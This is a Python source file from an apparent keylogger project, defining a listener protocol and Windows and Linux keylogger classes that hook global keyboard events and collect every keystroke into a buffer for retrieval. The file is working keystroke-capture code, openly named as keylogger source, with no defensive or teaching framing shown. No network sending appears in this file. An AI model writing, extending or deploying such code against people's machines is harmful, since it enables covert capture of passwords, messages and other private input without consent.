import threading
import keyboard
from pynput import keyboard as kb
from typing import List, Protocol

from keylogger.data_wrapper import DataWrapper


class Listener(Protocol):
    buffer: List[str]  # buffer to store the data

    """
    Listner is a protocol that defines the interface for listening to data.

    it will may be implemented by classes that listen to data in different ways.
    such as:
        Listen to keyboard events
        Listen to mouse events
        Listen to file changes
    """

    def start(self) -> None:
        """
        start listening to data.
        """
        ...

    def stop(self) -> None:
        """
        stop listening to data.
        """
        ...

    def get_data(self) -> List[str]:
        """
        get the data from the buffer.

        Also, clear the buffer after getting the data.
        """
        ...


class WindowsKeylogger:
    def __init__(self):
        self.buffer: List[str] = []

    def start(self) -> None:
        """
        start listening to keyboard events.
        """
        keyboard.hook(self._on_key_event)

    def stop(self) -> None:
        """
        stop listening to keyboard events.
        """
        keyboard.unhook_all()

    def get_data(self) -> DataWrapper:
        """
        get the data that has been collected and reset the buffer.
        """
        data = self.buffer.copy()
        self.buffer.clear()  # איפוס ה-buffer
        return DataWrapper(data)

    def _on_key_event(self, event):
        """
        internal method to handle key events.
        """
        self.buffer.append(event.name)


class LinuxKeylogger:
    def __init__(self):
        self.buffer: List[str] = []
        self.listener = kb.Listener(on_press=self._on_key_event)
        self._lock = threading.Lock()

    def start(self) -> None:
        """
        start listening to keyboard events.
        """
        self.listener.start()

    def stop(self) -> None:
        """
        stop listening to keyboard events.
        """
        if self.listener.is_alive():
            self.listener.stop()

    def get_data(self) -> DataWrapper:
        """
        get the data that has been collected and reset the buffer.
        """
        with self._lock:
            data = self.buffer.copy()
            self.buffer.clear()

        return DataWrapper(data)

    def _on_key_event(self, key: kb.Key | kb.KeyCode):
        """
        internal method to handle key events.
        """
        with self._lock:
            self.buffer.append(key.char if hasattr(key, "char") else key.name)
